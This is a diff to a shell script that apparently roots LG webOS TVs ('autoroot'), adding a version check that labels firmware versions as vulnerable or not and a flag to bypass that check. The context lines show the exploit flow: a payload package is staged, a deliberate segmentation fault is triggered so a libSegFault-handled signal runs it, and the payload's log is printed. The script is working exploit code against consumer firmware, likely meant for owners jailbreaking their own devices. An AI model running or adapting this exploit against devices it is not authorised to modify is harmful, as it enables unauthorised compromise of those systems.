@@ -140,7 +140,7 @@ verify_sd() {
     [ ! -f "${sd_script}" ] && return 0
 
     if [ ! -f "${sd_key}" ]; then
-        log "Expected Dev Mode public key is not present; please report this!"
+        log 'Expected Dev Mode public key is not present; please report this!'
         # Verification will fail without the public key file
         return 1
     fi
@@ -443,6 +443,9 @@ while [ "${#}" -gt 0 ]; do
             parent_pid="${3}"
             shift 2
         ;;
+        '--skip-version-check')
+            SKIP_VERSION_CHECK='arg'
+        ;;
         *)
             echo "Unknown option '${1}'"
             exit 1
@@ -496,6 +499,44 @@ add_exit_trap "cp -f -- '${logfile}' '${SCRIPT_DIR}/autoroot.log'"
 webos_version="$(get_sdkversion)"
 
 log "webOS version: ${webos_version}"
+
+if [ -n "${SKIP_VERSION_CHECK}" ]; then
+    log "Skipping version check."
+else
+    case "${webos_version}" in
+        [123].*)
+            error 'Vulnerability not present on webOS <4. (Pass --skip-version-check to bypass.)'
+            exit 1
+        ;;
+        4.*)
+            # Probably vulnerable
+        ;;
+        [5-9].*)
+            # Could be vulnerable
+            log 'note: If the exploit fails, confirm you are running vulnerable firmware.'
+        ;;
+        10.0.*)
+            # Possibly vulnerable
+            log 'note: webOS 10.0 may be vulnerable. Please let me know how it goes.'
+        ;;
+        10.[1-9]*)
+            # Highly unlikely to be vulnerable
+            error 'webOS 10.1+ is almost certainly not vulnerable. (Pass --skip-version-check to bypass.)'
+            exit 1
+        ;;
+        [1-9][0-9].*)
+            error 'This is just not going to work.'
+            exit 1
+        ;;
+        '')
+        # May signify old webOS
+            log 'warning: empty webOS version; may not be vulnerable!'
+        ;;
+        *)
+            log 'warning: unexpected webOS version format; please report this!'
+        ;;
+    esac
+fi
 
 payload_ipk="${tempdir}/${PAYLOAD_IPKNAME}"
 
@@ -595,6 +636,8 @@ echo "Triggering segmentation fault..."
 
 # Crash with one of the signals handled by libSegFault
 "${crash}" -c 'import os;os.kill(os.getpid(),11)' || true
+
+# TODO: Some kind of timeout.
 
 # Display output from payload
 echo "Payload log:"
